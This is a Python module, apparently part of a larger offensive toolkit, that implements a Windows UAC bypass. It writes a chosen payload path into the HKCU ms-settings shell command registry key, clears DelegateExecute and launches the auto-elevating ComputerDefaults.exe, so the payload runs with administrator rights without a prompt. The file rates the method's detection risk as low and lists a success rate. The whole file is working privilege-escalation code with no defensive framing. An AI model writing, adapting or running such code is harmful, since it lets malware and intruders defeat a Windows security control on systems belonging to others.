"""
ComputerDefaults UAC Bypass Module
Bypasses UAC using ComputerDefaults.exe registry hijacking.

How it works:
1. ComputerDefaults.exe auto-elevates
2. Uses similar registry hijacking as fodhelper
3. Exploits ms-settings protocol handler

Works on: Windows 10 up to build 17134 (1803)
"""

from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import UACBypassBase

try:
    import winreg

    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False


class ComputerDefaultsBypass(UACBypassBase):
    """UAC bypass using ComputerDefaults.exe."""

    METHOD_NAME = "computerdefaults"
    DESCRIPTION = "ComputerDefaults.exe UAC bypass (Windows 10)"
    MIN_VERSION = 10
    MAX_BUILD = 17134  # Patched after 1803
    DETECTION_RISK = "Low"
    SUCCESS_RATE = 0.75

    # Registry path
    REG_PATH = r'Software\Classes\ms-settings\shell\open\command'

    # ComputerDefaults executable path
    COMPUTERDEFAULTS_PATH = r'C:\Windows\System32\ComputerDefaults.exe'

    def __init__(self, output_dir: str = "uac_bypasses", verbose: bool = False):
        """
        Initialize the ComputerDefaults bypass.

        Args:
            output_dir: Directory for storing output files
            verbose: Enable verbose logging
        """
        super().__init__(output_dir, verbose)
        self.log("ComputerDefaults bypass module initialized", "SUCCESS")

    def bypass(self, payload_path: str) -> bool:
        """
        Execute ComputerDefaults UAC bypass.

        Args:
            payload_path: Path to payload executable

        Returns:
            True if successful, False otherwise
        """
        if not WINDOWS_AVAILABLE:
            self.log("Windows registry not available", "ERROR")
            return False

        self.log("Configuring registry for ComputerDefaults bypass...", "INFO")

        try:
            # Create registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)

            # Set default value to payload path
            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, payload_path)

            # Set DelegateExecute to empty
            winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')

            winreg.CloseKey(key)

            # Track for cleanup
            self.modified_registry.append(
                (winreg.HKEY_CURRENT_USER, self.REG_PATH, '')
            )

            self.log("Registry configured successfully", "SUCCESS")

            # Execute ComputerDefaults
            self.log("Triggering ComputerDefaults.exe...", "INFO")

            success = self.execute_process(
                self.COMPUTERDEFAULTS_PATH,
                wait=False,
                timeout=3
            )

            return success

        except Exception as e:
            self.log(f"ComputerDefaults bypass failed: {e}", "ERROR")
            return False


if __name__ == "__main__":
    bypass = ComputerDefaultsBypass(verbose=True)
    print(f"\nMethod: {bypass.METHOD_NAME}")
    print(f"Description: {bypass.DESCRIPTION}")
    print(f"Success Rate: {bypass.SUCCESS_RATE * 100:.0f}%")